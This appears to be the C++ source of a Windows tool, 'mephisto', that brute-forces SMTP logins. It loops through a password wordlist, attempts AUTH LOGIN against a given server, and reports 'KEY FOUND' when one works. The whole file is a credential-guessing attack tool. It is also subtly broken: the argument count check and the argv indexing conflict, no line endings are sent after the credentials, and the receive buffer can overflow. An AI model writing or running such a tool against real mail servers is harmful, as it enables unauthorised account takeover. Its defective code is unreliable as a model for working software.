#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <Winsock2.h>
#include <windows.h>
#include "mephisto.h" // Include the header file

#pragma comment(lib, "ws2_32.lib")

// Function to handle SMTP communication
bool smtpConnectAndAuthenticate(const std::string &server, int port, const std::string &username, const std::string &password) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr;
    char buffer[1024];
    
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed." << std::endl;
        return false;
    }

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed." << std::endl;
        WSACleanup();
        return false;
    }

    // Resolve server address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(server.c_str());

    // Connect to the server
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connection failed." << std::endl;
        closesocket(sock);
        WSACleanup();
        return false;
    }

    // Read server greeting
    int ret = recv(sock, buffer, sizeof(buffer), 0);
    if (ret <= 0) {
        std::cerr << "Failed to receive greeting." << std::endl;
        closesocket(sock);
        WSACleanup();
        return false;
    }
    buffer[ret] = '\0';
    std::cout << "Server greeting: " << buffer << std::endl;

    // Send EHLO
    std::string ehlo = "EHLO localhost\r\n";
    send(sock, ehlo.c_str(), ehlo.length(), 0);

    // Authenticate using LOGIN method
    std::string login = "AUTH LOGIN\r\n";
    send(sock, login.c_str(), login.length(), 0);

    // Send base64 encoded username and password
    std::string encodedUsername = base64_encode(username);
    std::string encodedPassword = base64_encode(password);

    send(sock, encodedUsername.c_str(), encodedUsername.length(), 0);
    ret = recv(sock, buffer, sizeof(buffer), 0);
    buffer[ret] = '\0';

    if (std::string(buffer).find("334") != std::string::npos) {
        send(sock, encodedPassword.c_str(), encodedPassword.length(), 0);
        ret = recv(sock, buffer, sizeof(buffer), 0);
        buffer[ret] = '\0';

        // If authentication is successful
        if (std::string(buffer).find("235") != std::string::npos) {
            std::cout << "KEY FOUND: " << password << std::endl;
            closesocket(sock);
            WSACleanup();
            return true;
        }
    }

    closesocket(sock);
    WSACleanup();
    return false;
}

// Base64 encoding
std::string base64_encode(const std::string &in) {
    static const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    int val = 0, valb = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) {
        out.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    }
    while (out.size() % 4) {
        out.push_back('=');
    }
    return out;
}

// Main function to iterate through wordlist
int main(int argc, char *argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: mephisto.exe -l <username> -P <path_to_wordlist> <server> <port>" << std::endl;
        return 1;
    }

    std::string username = argv[2];
    std::string wordlistPath = argv[4];
    std::string server = argv[3];
    int port = std::stoi(argv[5]);

    std::ifstream wordlist(wordlistPath);
    if (!wordlist) {
        std::cerr << "Error opening wordlist file." << std::endl;
        return 1;
    }

    std::string password;
    while (std::getline(wordlist, password)) {
        if (smtpConnectAndAuthenticate(server, port, username, password)) {
            return 0;  // Password found
        }
    }

    std::cout << "KEY NOT FOUND" << std::endl;
    return 0;
}
